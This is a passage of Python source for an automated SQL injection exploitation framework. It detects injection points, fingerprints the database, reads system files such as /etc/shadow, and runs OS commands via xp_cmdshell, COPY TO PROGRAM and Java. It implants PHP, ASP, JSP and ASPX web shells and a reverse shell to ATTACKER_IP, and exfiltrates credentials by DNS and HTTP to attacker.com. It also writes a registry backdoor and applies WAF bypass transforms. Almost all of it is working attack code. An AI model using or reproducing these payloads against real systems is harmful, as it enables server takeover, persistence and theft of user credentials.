        unique_columns = list(set(columns))
        
        if unique_columns:
            print(f"{Colors.GREEN}[+] Found columns: {unique_columns}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] No columns extracted{Colors.END}")
        
        return unique_columns
    
    def extract_data(self, table, columns, limit=10):
        """Extract actual data from table"""
        print(f"{Colors.BLUE}[*] Extracting data from {table}...{Colors.END}")
        
        column_list = ",".join(columns[:4])  # Limit to first 4 columns
        
        payloads = [
            f"' UNION SELECT {column_list},null FROM {table} LIMIT {limit}-- ",
            f"' UNION SELECT TOP {limit} {column_list},null FROM {table}-- ",
        ]
        
        data = []
        
        for payload in payloads:
            try:
                parsed = urlparse(self.vuln['url'])
                params = parse_qs(parsed.query)
                params[self.vuln['parameter']] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Parse response for data
                soup = BeautifulSoup(response.text, 'html.parser')
                text = soup.get_text()
                
                # Look for structured data patterns
                data_patterns = [
                    r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',  # Email
                    r'(\$[0-9a-f]{32})',  # MD5 hash
                    r'(\$2[abyxz]\$[0-9]{2}\$[A-Za-z0-9./]{53})',  # bcrypt
                ]
                
                for pattern in data_patterns:
                    matches = re.findall(pattern, text)
                    data.extend(matches)
                
            except Exception as e:
                continue
        
        if data:
            print(f"{Colors.GREEN}[+] Extracted {len(data)} data entries{Colors.END}")
            for item in data[:5]:  # Show first 5 entries
                print(f"  {Colors.WHITE}{item}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] No data extracted{Colors.END}")
        
        return data

class DatabaseExploiter:
    """Database-specific exploitation techniques from Ultimate Guide 2025"""
    
    def __init__(self, session, vulnerability, db_type='mysql'):
        self.session = session
        self.vuln = vulnerability
        self.db_type = db_type.lower()
        
        # Database-specific exploitation payloads
        self.exploitation_payloads = {
            'mysql': {
                'file_read': [
                    "' UNION SELECT LOAD_FILE('/etc/passwd'),null,null-- ",
                    "' UNION SELECT LOAD_FILE(0x2f6574632f706173737764),null,null-- ",
                    "' UNION SELECT LOAD_FILE('/etc/shadow'),null,null-- ",
                    "' UNION SELECT LOAD_FILE('/proc/version'),null,null-- "
                ],
                'file_write': [
                    "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',null,null INTO OUTFILE '/var/www/html/shell.php'-- ",
                    "' UNION SELECT 0x3C3F706870206576616C28245F474554275B636D645D27293B3F3E,null,null INTO DUMPFILE '/var/www/html/shell.php'-- ",
                    "' UNION SELECT CHAR(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,34,99,109,100,34,93,41,59,32,63,62),null,null INTO OUTFILE '/var/www/html/cmd.php'-- "
                ],
                'udf_execution': [
                    "' UNION SELECT 'CREATE FUNCTION sys_exec RETURNS INTEGER SONAME \"lib_mysqludf_sys.so\"',null-- ",
                    "'; SELECT sys_exec('id')-- ",
                    "'; SELECT sys_exec('whoami')-- "
                ],
                'log_poisoning': [
                    "'; SET GLOBAL general_log = 'ON'-- ",
                    "'; SET GLOBAL general_log_file = '/var/www/html/shell.php'-- ",
                    "'; SELECT '<?php system($_GET[\"cmd\"]); ?>'-- ",
                    "'; SET GLOBAL general_log = 'OFF'-- "
                ]
            },
            'mssql': {
                'xp_cmdshell': [
                    "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;-- ",
                    "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- ",
                    "'; EXEC xp_cmdshell 'whoami'-- ",
                    "'; EXEC xp_cmdshell 'dir C:\\'-- "
                ],
                'alternative_execution': [
                    "'; EXEC sp_OACreate 'WScript.Shell', @O out; EXEC sp_OAMethod @O, 'run', NULL, 'cmd.exe /c whoami'-- ",
                    "'; EXEC sp_OACreate 'Shell.Application', @O out; EXEC sp_OAMethod @O, 'ShellExecute', null, 'cmd', '/c whoami', '', '', 1-- "
                ],
                'file_operations': [
                    "' BULK INSERT temp_table FROM 'c:\\temp\\file.txt'-- ",
                    "'; EXEC xp_fileexist 'C:\\Windows\\System32\\cmd.exe'-- "
                ],
                'registry_operations': [
                    "'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Services\\MSSQLSERVER','ImagePath'-- ",
                    "'; EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run','backdoor','REG_SZ','C:\\backdoor.exe'-- "
                ]
            },
            'postgresql': {
                'file_operations': [
                    "' UNION SELECT pg_read_file('/etc/passwd'),null,null,null-- ",
                    "' UNION SELECT pg_read_file('/etc/passwd', 0, 200),null,null,null-- ",
                    "' UNION SELECT pg_ls_dir('/'),null,null,null-- ",
                    "' UNION SELECT pg_ls_dir('/etc'),null,null,null-- "
                ],
                'command_execution': [
                    "'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT-- ",
                    "'; SELECT system('id')-- ",
                    "'; COPY (SELECT '') TO PROGRAM 'id'-- ",
                    "'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec-- "
                ],
                'file_write': [
                    "' COPY (SELECT 'shell content') TO '/tmp/shell.php'-- ",
                    "' COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php'-- "
                ]
            },
            'oracle': {
                'java_execution': [
                    "' UNION SELECT dbms_java.runjava('oracle/aurora/util/Wrapper /bin/bash -c id'),null,null,null FROM dual-- ",
                    "' UNION SELECT dbms_java.runjava('oracle/aurora/util/Wrapper /bin/bash -c whoami'),null,null,null FROM dual-- "
                ],
                'file_operations': [
                    "' UNION SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/tmp','file.txt','r'),1),null,null,null FROM dual-- "
                ],
                'network_operations': [
                    "' UNION SELECT UTL_INADDR.get_host_name,null,null,null FROM dual-- ",
                    "' UNION SELECT UTL_INADDR.get_host_address('google.com'),null,null,null FROM dual-- ",
                    "' UNION SELECT UTL_HTTP.request('http://attacker.com/data='||username||':'||password),null,null,null FROM (SELECT username,password FROM users WHERE rownum=1)-- "
                ]
            }
        }
    
    def exploit_database(self, exploit_type='file_write'):
        """Execute database-specific exploitation"""
        if self.db_type not in self.exploitation_payloads:
            return None
            
        if exploit_type not in self.exploitation_payloads[self.db_type]:
            return None
            
        payloads = self.exploitation_payloads[self.db_type][exploit_type]
        results = []
        
        for payload in payloads:
            try:
                # Execute the payload
                test_url = f"{self.vuln['url']}{payload}"
                response = self.session.get(test_url, timeout=30)
                results.append({
                    'payload': payload,
                    'response': response.text[:500],
                    'status_code': response.status_code
                })
                time.sleep(1)
            except Exception as e:
                results.append({
                    'payload': payload,
                    'error': str(e),
                    'status_code': 0
                })
        
        return results

class WebShellUploader:
    """Web shell upload and management from Ultimate Guide 2025"""
    
    def __init__(self, session, vulnerability):
        self.session = session
        self.vuln = vulnerability
        
        # Advanced web shells from the guide
        self.shells = {
            'php_simple': '<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>',
            'php_advanced': '''<?php
session_start();
$password = "mysecretpass";

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['password']) && $_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
    } else {
        echo '<form method="post">Password: <input type="password" name="password"><input type="submit" value="Login"></form>';
        exit;
    }
}

if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
<h2>Web Shell Commands</h2>
<form method="get">
    Command: <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>''',
            'php_reverse': '<?php $sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3"); ?>',
            'asp': '''<%
Dim cmd
cmd = Request.QueryString("cmd")

If cmd <> "" Then
    Dim objShell, objExec
    Set objShell = Server.CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd.exe /c " & cmd)
    
    Response.Write "<pre>"
    Do While Not objExec.StdOut.AtEndOfStream
        Response.Write Server.HTMLEncode(objExec.StdOut.ReadLine) & vbCrLf
    Loop
    Response.Write "</pre>"
End If
%>
<form method="get">
    Command: <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>''',
            'jsp': '''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    try {
        Process process = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        out.println("<pre>");
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
        reader.close();
    } catch (Exception e) {
        out.println("Error: " + e.getMessage());
    }
}
%>
<form method="get">
    Command: <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>''',
            'aspx': '''<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c "+arg;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();
    return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
    Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>ASPX Web Shell</title>
</HEAD>
<body>
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="width:250px" runat="server"></asp:TextBox>
<asp:Button id="testing" runat="server" Text="Execute" OnClick="cmdExe_Click"></asp:Button>
</form>
</body>
</HTML>'''
        }
        
        # Common upload paths for shell deployment
        self.upload_paths = [
            '/var/www/html/',
            '/var/www/',
            '/var/www/html/uploads/',
            '/var/www/uploads/',
            '/tmp/',
            '/home/www-data/',
            'C:\\inetpub\\wwwroot\\',
            'C:\\xampp\\htdocs\\',
            'C:\\wamp\\www\\',
            '../../../var/www/html/',
            '../../var/www/html/',
            '../var/www/html/'
        ]
    
    def upload_shell(self, shell_type='php_simple', custom_path=None):
        """Upload web shell through SQL injection"""
        if shell_type not in self.shells:
            return None
            
        shell_code = self.shells[shell_type]
        results = []
        
        # Try different upload paths
        paths = [custom_path] if custom_path else self.upload_paths
        
        for path in paths:
            if not path:
                continue
                
            shell_filename = f"shell_{int(time.time())}.php"
            full_path = f"{path}{shell_filename}"
            
            # MySQL file write payload
            payload = f"' UNION SELECT '{shell_code}',null,null INTO OUTFILE '{full_path}'-- "
            
            try:
                test_url = f"{self.vuln['url']}{payload}"
                response = self.session.get(test_url, timeout=30)
                
                # Check if shell was uploaded successfully
                shell_url = self._construct_shell_url(full_path)
                test_response = self.session.get(shell_url + "?cmd=whoami", timeout=10)
                
                if test_response.status_code == 200 and 'www-data' in test_response.text:
                    results.append({
                        'status': 'success',
                        'shell_url': shell_url,
                        'path': full_path,
                        'payload': payload
                    })
                else:
                    results.append({
                        'status': 'failed',
                        'path': full_path,
                        'payload': payload,
                        'response': response.text[:200]
                    })
            except Exception as e:
                results.append({
                    'status': 'error',
                    'path': full_path,
                    'error': str(e)
                })
        
        return results
    
    def _construct_shell_url(self, file_path):
        """Construct web accessible URL for uploaded shell"""
        base_url = self.vuln['url'].split('?')[0]
        domain = '/'.join(base_url.split('/')[:3])
        
        # Common web root mappings
        if '/var/www/html/' in file_path:
            web_path = file_path.replace('/var/www/html/', '/')
        elif 'C:\\inetpub\\wwwroot\\' in file_path:
            web_path = file_path.replace('C:\\inetpub\\wwwroot\\', '/')
        else:
            web_path = '/' + file_path.split('/')[-1]
            
        return domain + web_path

class MetasploitIntegrator:
    """Metasploit module integration from Ultimate Guide 2025"""
    
    def __init__(self):
        self.msf_path = self._find_metasploit()
        self.available_modules = {
            'mysql': {
                'enum': 'auxiliary/admin/mysql/mysql_enum',
                'hashdump': 'auxiliary/admin/mysql/mysql_hashdump',
                'sql': 'auxiliary/admin/mysql/mysql_sql',
                'file_enum': 'auxiliary/admin/mysql/mysql_file_enum'
            },
            'mssql': {
                'login': 'auxiliary/admin/mssql/mssql_login',
                'enum': 'auxiliary/admin/mssql/mssql_enum',
                'exec': 'auxiliary/admin/mssql/mssql_exec',
                'payload': 'exploit/windows/mssql/mssql_payload'
            },
            'postgresql': {
                'login': 'auxiliary/admin/postgres/postgres_login', 
                'readfile': 'auxiliary/admin/postgres/postgres_readfile',
                'sql': 'auxiliary/admin/postgres/postgres_sql'
            },
            'oracle': {
                'login': 'auxiliary/admin/oracle/oracle_login',
                'enum': 'auxiliary/admin/oracle/tnscmd'
            }
        }
    
    def _find_metasploit(self):
        """Find Metasploit installation path"""
        common_paths = [
            '/usr/share/metasploit-framework/',
            '/opt/metasploit-framework/',
            '/usr/local/share/metasploit-framework/'
        ]
        
        for path in common_paths:
            if os.path.exists(path + 'msfconsole'):
                return path
        
        # Check if msfconsole is in PATH
        try:
            subprocess.run(['which', 'msfconsole'], check=True, capture_output=True)
            return 'PATH'
        except subprocess.CalledProcessError:
            return None
    
    def generate_resource_script(self, target_info, db_type='mysql'):
        """Generate Metasploit resource script for SQL injection exploitation"""
        if db_type not in self.available_modules:
            return None
            
        script_lines = [
            '# Auto-generated SQL injection exploitation script',
            '# Based on Ultimate SQL Injection Guide 2025',
            '',
            'workspace -a sqli_test',
            'workspace sqli_test',
            ''
        ]
        
        modules = self.available_modules[db_type]
        
        for module_name, module_path in modules.items():
            script_lines.extend([
                f'use {module_path}',
                f'set RHOSTS {target_info.get("host", "TARGET_IP")}',
                f'set RPORT {target_info.get("port", "3306")}',
                f'set USERNAME {target_info.get("username", "root")}',
                f'set PASSWORD {target_info.get("password", "")}',
                'run',
                ''
            ])
        
        return '\n'.join(script_lines)
    
    def execute_module(self, module_path, options):
        """Execute Metasploit module with given options"""
        if not self.msf_path:
            return {'error': 'Metasploit not found'}
            
        # Create temporary resource script
        script_content = f"use {module_path}\n"
        for key, value in options.items():
            script_content += f"set {key} {value}\n"
        script_content += "run\nexit\n"
        
        script_file = f"/tmp/msf_script_{int(time.time())}.rc"
        with open(script_file, 'w') as f:
            f.write(script_content)
        
        try:
            # Execute msfconsole with resource script
            cmd = ['msfconsole', '-q', '-r', script_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Clean up
            os.unlink(script_file)
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }
        except subprocess.TimeoutExpired:
            return {'error': 'Module execution timed out'}
        except Exception as e:
            return {'error': str(e)}

class SQLInjectionDetector:
    """SQL injection detection engine"""
    
    def __init__(self, session, target_url):
        self.session = session
        self.target_url = target_url
        self.payloads = SQLPayloads()
    
    def test_injection(self, param, test_type='error_based'):
        """Test for SQL injection vulnerability"""
        # Basic detection logic
        test_payloads = {
            'error_based': self.payloads.ERROR_BASED[:3],
            'blind_boolean': self.payloads.BOOLEAN_BLIND[:3],
            'time_based': list(self.payloads.TIME_BASED['mysql'])[:3] if 'mysql' in self.payloads.TIME_BASED else ["' AND SLEEP(5)--"],
            'union_based': self.payloads.UNION_BASED[:3]
        }
        
        if test_type not in test_payloads:
            return None
            
        for payload in test_payloads[test_type]:
            try:
                test_url = f"{self.target_url}?{param}={payload}"
                response = self.session.get(test_url, timeout=10)
                
                # Simple detection logic
                if 'error' in response.text.lower() or 'sql' in response.text.lower():
                    return {
                        'vulnerable': True,
                        'payload': payload,
                        'evidence': 'SQL error detected',
                        'type': test_type
                    }
            except Exception:
                continue
                
        return {'vulnerable': False}

class ProfessionalWorkflowEngine:
    """Professional exploitation workflow automation from Ultimate Guide 2025"""
    
    def __init__(self, session, target_url):
        self.session = session
        self.target_url = target_url
        self.discovered_vulns = []
        self.exploitation_results = []
        self.workflow_log = []
        
        # Initialize all components
        self.detector = SQLInjectionDetector(session, target_url)
        self.extractor = DataExtractor(session, None)
        self.shell_uploader = WebShellUploader(session, None)
        self.msf_integrator = MetasploitIntegrator()
        
    def execute_full_workflow(self, target_params=None):
        """Execute complete professional SQL injection workflow"""
        self.log("Starting Professional SQL Injection Assessment")
        
        # Phase 1: Discovery and Detection
        self.log("Phase 1: Vulnerability Discovery")
        vulns = self._discovery_phase(target_params)
        
        if not vulns:
            self.log("No SQL injection vulnerabilities found")
            return self._generate_report()
            
        # Phase 2: Exploitation
        self.log("Phase 2: Exploitation Phase")
        self._exploitation_phase(vulns)
        
        # Phase 3: Post-Exploitation
        self.log("Phase 3: Post-Exploitation")
        self._post_exploitation_phase()
        
        # Phase 4: Reporting
        return self._generate_report()
        
    def _discovery_phase(self, target_params):
        """Phase 1: Vulnerability discovery"""
        vulns = []
        
        # Test different injection points
        test_points = target_params or [{'param': 'id', 'value': '1'}]
        
        for point in test_points:
            self.log(f"Testing parameter: {point['param']}")
            
            # Test all injection types
            for test_type in ['error_based', 'blind_boolean', 'time_based', 'union_based']:
                result = self.detector.test_injection(point['param'], test_type)
                if result and result.get('vulnerable'):
                    vuln = {
                        'param': point['param'],
                        'type': test_type,
                        'payload': result.get('payload'),
                        'evidence': result.get('evidence'),
                        'url': self.target_url
                    }
                    vulns.append(vuln)
                    self.discovered_vulns.append(vuln)
                    self.log(f"Vulnerability found: {test_type} in {point['param']}")
        
        return vulns
        
    def _exploitation_phase(self, vulns):
        """Phase 2: Exploit vulnerabilities"""
        for vuln in vulns:
            self.log(f"Exploiting {vuln['type']} vulnerability")
            
            # Database fingerprinting
            db_info = self._fingerprint_database(vuln)
            
            if db_info:
                # Initialize database-specific exploiter
                exploiter = DatabaseExploiter(self.session, vuln, db_info['type'])
                
                # Try different exploitation techniques
                exploit_results = []
                
                # File operations
                if db_info['type'] in ['mysql', 'postgresql']:
                    file_result = exploiter.exploit_database('file_read')
                    if file_result:
                        exploit_results.extend(file_result)
                        
                # Command execution
                if db_info['type'] in ['mssql', 'postgresql', 'oracle']:
                    cmd_result = exploiter.exploit_database('command_execution' if db_info['type'] == 'postgresql' else 'xp_cmdshell')
                    if cmd_result:
                        exploit_results.extend(cmd_result)
                        
                # Web shell upload
                if db_info['type'] == 'mysql':
                    shell_result = self.shell_uploader.upload_shell('php_advanced')
                    if shell_result:
                        exploit_results.extend(shell_result)
                        
                self.exploitation_results.extend(exploit_results)
                
    def _post_exploitation_phase(self):
        """Phase 3: Post-exploitation activities"""
        for vuln in self.discovered_vulns:
            # Data extraction
            self.log("Extracting sensitive data")
            extractor = DataExtractor(self.session, vuln)
            
            # Extract common sensitive tables
            for table in ['users', 'admin', 'accounts', 'members']:
                data = extractor.extract_table_data(table, ['username', 'password', 'email'])
                if data:
                    self.exploitation_results.append({
                        'type': 'data_extraction',
                        'table': table,
                        'data': data[:10]  # Limit to first 10 rows
                    })
                    
    def _fingerprint_database(self, vuln):
        """Fingerprint database type and version"""
        fingerprint_payloads = {
            'mysql': "' AND @@version LIKE '%'-- ",
            'mssql': "' AND @@version LIKE '%'-- ",
            'postgresql': "' AND version() LIKE '%'-- ",
            'oracle': "' AND banner LIKE '%' FROM v$version WHERE rownum=1-- ",
            'sqlite': "' AND sqlite_version() LIKE '%'-- "
        }
        
        for db_type, payload in fingerprint_payloads.items():
            try:
                test_url = f"{vuln['url']}?{vuln['param']}={payload}"
                response = self.session.get(test_url, timeout=10)
                
                # Check for database-specific signatures
                if db_type == 'mysql' and 'MySQL' in response.text:
                    return {'type': 'mysql', 'version': self._extract_version(response.text, 'MySQL')}
                elif db_type == 'mssql' and 'Microsoft SQL Server' in response.text:
                    return {'type': 'mssql', 'version': self._extract_version(response.text, 'SQL Server')}
                elif db_type == 'postgresql' and 'PostgreSQL' in response.text:
                    return {'type': 'postgresql', 'version': self._extract_version(response.text, 'PostgreSQL')}
                elif db_type == 'oracle' and 'Oracle' in response.text:
                    return {'type': 'oracle', 'version': self._extract_version(response.text, 'Oracle')}
                elif db_type == 'sqlite' and '3.' in response.text:
                    return {'type': 'sqlite', 'version': self._extract_version(response.text, '3.')}
                    
            except Exception:
                continue
                
        return None
        
    def _extract_version(self, text, db_marker):
        """Extract database version from response"""
        try:
            start = text.find(db_marker)
            if start != -1:
                version_part = text[start:start+50]
                return version_part.split()[0] if version_part else "Unknown"
        except:
            pass
        return "Unknown"
        
    def log(self, message):
        """Log workflow progress"""
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] {message}"
        self.workflow_log.append(log_entry)
        print(log_entry)
        
    def _generate_report(self):
        """Generate comprehensive assessment report"""
        report = {
            'assessment_info': {
                'target': self.target_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulns': len(self.discovered_vulns),
                'successful_exploits': len([r for r in self.exploitation_results if r.get('status') == 'success'])
            },
            'vulnerabilities': self.discovered_vulns,
            'exploitation_results': self.exploitation_results,
            'workflow_log': self.workflow_log,
            'recommendations': self._generate_recommendations()
        }
        
        return report
        
    def _generate_recommendations(self):
        """Generate security recommendations"""
        recommendations = [
            "Implement parameterized queries/prepared statements",
            "Apply input validation and sanitization",
            "Use least privilege principle for database accounts",
            "Enable database logging and monitoring",
            "Regular security testing and code review"
        ]
        
        # Add specific recommendations based on findings
        if any(v['type'] == 'union_based' for v in self.discovered_vulns):
            recommendations.append("Disable database error messages in production")
            
        if any(r.get('type') == 'data_extraction' for r in self.exploitation_results):
            recommendations.append("Encrypt sensitive data at rest")
            recommendations.append("Implement database access controls")
            
        return recommendations

class AdvancedDataExtractor:
    """Advanced data extraction techniques from Ultimate Guide 2025"""
    
    def __init__(self, session, vulnerability):
        self.session = session
        self.vuln = vulnerability
        
    def binary_search_extraction(self, query_template, min_val=0, max_val=1000000):
        """Binary search technique for blind SQL injection data extraction"""
        result = ""
        position = 1
        
        while True:
            char_found = False
            char_min, char_max = 32, 126  # ASCII printable range
            
            while char_min <= char_max:
                char_mid = (char_min + char_max) // 2
                
                # Test if character at position is greater than mid value
                payload = query_template.format(
                    position=position,
                    char_code=char_mid
                )
                
                test_url = f"{self.vuln['url']}?{self.vuln['param']}={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    # Adjust based on response (true/false condition)
                    if self._is_true_response(response):
                        char_min = char_mid + 1
                    else:
                        char_max = char_mid - 1
                        
                except Exception:
                    break
                    
            # Found character
            if char_max >= 32:  # Valid ASCII character
                result += chr(char_max)
                position += 1
                char_found = True
            else:
                break
                
            if not char_found or len(result) > 100:  # Reasonable limit
                break
                
        return result
        
    def dns_exfiltration(self, query, dns_domain="attacker.com"):
        """DNS exfiltration for out-of-band data extraction"""
        # Construct DNS exfiltration payload
        payload = f"'; SELECT load_file(concat('\\\\', (SELECT hex({query})), '.{dns_domain}\\share\\file.txt'))-- "
        
        try:
            test_url = f"{self.vuln['url']}?{self.vuln['param']}={payload}"
            response = self.session.get(test_url, timeout=30)
            
            return {
                'payload': payload,
                'status': 'sent',
                'note': f'Check DNS logs for subdomain queries to {dns_domain}'
            }
        except Exception as e:
            return {'error': str(e)}
            
    def http_exfiltration(self, query, exfil_url="http://attacker.com/collect"):
        """HTTP exfiltration for out-of-band data extraction"""
        # Construct HTTP exfiltration payload  
        payload = f"'; SELECT load_file(concat('{exfil_url}?data=', (SELECT hex({query}))))-- "
        
        try:
            test_url = f"{self.vuln['url']}?{self.vuln['param']}={payload}"
            response = self.session.get(test_url, timeout=30)
            
            return {
                'payload': payload,
                'status': 'sent',
                'note': f'Check HTTP server logs at {exfil_url}'
            }
        except Exception as e:
            return {'error': str(e)}
            
    def _is_true_response(self, response):
        """Determine if response indicates true condition for blind SQLi"""
        # Check for common indicators of successful condition
        indicators = [
            len(response.text) > 1000,  # Page loads normally
            response.status_code == 200,
            'welcome' in response.text.lower(),
            'success' in response.text.lower()
        ]
        
        return any(indicators)

# Enhanced WAF Bypass Engine from Ultimate Guide 2025
class WAFBypassEngine:
    """Comprehensive WAF bypass techniques from Ultimate Guide 2025"""
    
    def __init__(self):
        self.bypass_techniques = {
            'case_variation': self._case_variation,
            'comment_insertion': self._comment_insertion,
            'string_concatenation': self._string_concatenation,
            'encoding_methods': self._encoding_methods,
            'alternative_syntax': self._alternative_syntax,
            'function_based': self._function_based_bypass,
            'modSecurity_bypass': self._modsecurity_bypass,
            'cloudflare_bypass': self._cloudflare_bypass,
            'whitespace_manipulation': self._whitespace_manipulation,
            'keyword_obfuscation': self._keyword_obfuscation
        }
    
    def apply_bypasses(self, original_payload, techniques=None):
        """Apply multiple WAF bypass techniques to payload"""
        if techniques is None:
            techniques = list(self.bypass_techniques.keys())
            
        bypassed_payloads = []
        
        for technique in techniques:
            if technique in self.bypass_techniques:
                try:
                    modified_payload = self.bypass_techniques[technique](original_payload)
                    if modified_payload != original_payload:
                        bypassed_payloads.append({
                            'technique': technique,
                            'payload': modified_payload
                        })
                except Exception:
                    continue
                    
        return bypassed_payloads
    
    def _case_variation(self, payload):
        """Apply case variation bypass"""
        # Random case variation
        import random
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.choice([True, False]) else char.lower()
            else:
                result += char
        return result
    
    def _comment_insertion(self, payload):
        """Insert SQL comments for bypass"""
        comment_variations = [
            payload.replace(' AND ', ' /*comment*/ AND /*comment*/ '),
            payload.replace(' OR ', ' /*bypass*/ OR /*bypass*/ '),
            payload.replace('UNION', 'UN/**/ION'),
            payload.replace('SELECT', 'SEL/*bypass*/ECT'),
            payload.replace('FROM', 'FR/**/OM')
        ]
        return random.choice(comment_variations) if comment_variations else payload
    
    def _string_concatenation(self, payload):
        """Use string concatenation for bypass"""
        # MySQL concatenation
        if 'SELECT' in payload.upper():
            return payload.replace('SELECT', "CONCAT('SEL','ECT')")
        elif 'UNION' in payload.upper():
            return payload.replace('UNION', "CONCAT('UNI','ON')")
        return payload
    
    def _encoding_methods(self, payload):
        """Apply various encoding methods"""
        import urllib.parse
        
        encoding_methods = [
            urllib.parse.quote(payload),  # URL encoding
            urllib.parse.quote_plus(payload),  # URL plus encoding
            payload.encode('utf-8').hex(),  # Hex encoding
            ''.join(f'&#x{ord(c):02x};' for c in payload)  # HTML hex entities
        ]
        
        return random.choice(encoding_methods)
    
    def _alternative_syntax(self, payload):
        """Use alternative SQL syntax"""
        alternatives = {
            'AND': '&&',
            'OR': '||',
            '=': 'LIKE',
            'UNION SELECT': 'UNION ALL SELECT',
            'ORDER BY': 'GROUP BY',
            ' ': '%20'
        }
        
        result = payload
        for original, alternative in alternatives.items():
            if original in result:
                result = result.replace(original, alternative)
                break
                
        return result
    
    def _function_based_bypass(self, payload):
        """Function-based bypasses"""
        function_bypasses = [
            payload.replace("'", "CHAR(39)"),
            payload.replace('SELECT', 'SELECT(1)UNION(SELECT'),
            payload.replace('UNION', 'UNION(SELECT(0)FROM(SELECT(COUNT(*))FROM(INFORMATION_SCHEMA.TABLES)GROUP(BY(0))UNION'),
            payload.replace(' ', 'CONCAT(CHAR(32))')
        ]
        
        return random.choice(function_bypasses) if function_bypasses else payload
    
    def _modsecurity_bypass(self, payload):
        """ModSecurity specific bypasses"""
        # Common ModSecurity bypasses
        modsec_bypasses = [
            payload.replace('union', 'union all'),
            payload.replace('select', 'Select'),
            payload.replace('script', 'ScRiPt'),
            payload.replace(' and ', ' /*!50000AND*/ '),
            payload.replace('()', '/**/()**/'),
            payload.replace('=', '/*!50000=*/'),
            payload.replace('union select', 'union/**/select')
        ]
        
        return random.choice(modsec_bypasses) if modsec_bypasses else payload
    
    def _cloudflare_bypass(self, payload):
        """Cloudflare specific bypasses"""
        # Cloudflare bypass techniques
        cf_bypasses = [
            payload.replace('SELECT', 'sELeCt'),
            payload.replace('UNION', 'uNiOn'),
            payload.replace(' FROM ', ' fRoM '),
            payload.replace('script', 'scr\'+\'ipt'),
            payload.replace('<', '%3C').replace('>', '%3E'),
            payload.replace(' ', '/**/'),
            payload.replace('AND', 'aNd')
        ]
        
        return random.choice(cf_bypasses) if cf_bypasses else payload
    
    def _whitespace_manipulation(self, payload):
        """Manipulate whitespace for bypass"""
        whitespace_chars = ['%20', '%09', '%0A', '%0B', '%0C', '%0D', '/**/', '+', '%2B']
        
        # Replace spaces with alternative whitespace
        result = payload.replace(' ', random.choice(whitespace_chars))
        return result
    
    def _keyword_obfuscation(self, payload):
        """Obfuscate SQL keywords"""
        obfuscations = {
            'UNION': ['UNION', 'un/**/ion', 'Un/**/IoN', '/*!50000UNION*/'],
            'SELECT': ['SELECT', 'sel/**/ect', 'Se/**/LeCt', '/*!50000SELECT*/'],
            'FROM': ['FROM', 'fr/**/om', 'Fr/**/Om', '/*!50000FROM*/'],
            'WHERE': ['WHERE', 'wh/**/ere', 'Wh/**/ErE', '/*!50000WHERE*/'],
            'AND': ['AND', 'an/**/d', 'An/**/D', '/*!50000AND*/', '&&'],
            'OR': ['OR', 'o/**/r', 'O/**/R', '/*!50000OR*/', '||']
        }
        
        result = payload
        for keyword, variations in obfuscations.items():
            if keyword in result.upper():
                result = result.replace(keyword, random.choice(variations))
                break
                
        return result

# Enhanced main testing class with integrated components
class EnhancedSQLInjectionTester:
    """Enhanced SQL Injection Tester with all Ultimate Guide 2025 capabilities"""
    
    def __init__(self, session=None, target_url=None):
        self.session = session or requests.Session()
        self.target_url = target_url
        
        # Initialize all enhanced components
        self.detector = SQLInjectionDetector(self.session, target_url)
